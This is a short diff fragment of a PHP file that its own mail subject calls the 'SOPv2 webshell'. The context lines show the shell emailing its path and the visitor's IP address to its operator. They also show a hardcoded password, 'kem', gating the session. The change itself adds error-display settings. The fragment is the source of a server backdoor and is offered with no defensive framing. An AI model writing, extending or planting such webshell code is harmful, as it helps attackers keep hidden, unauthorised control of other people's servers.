@@ -5,6 +5,8 @@ $pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] P
 mail($tujuanmail, "SOPv2 webshell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?><?php
 session_start();
+error_reporting(E_ALL);
+ini_set("display_errors", 1);
 $pass = "kem";
 if (!isset($_SESSION["auth"])) {
     if (isset($_POST["pass"]) && $_POST["pass"] === $pass) {
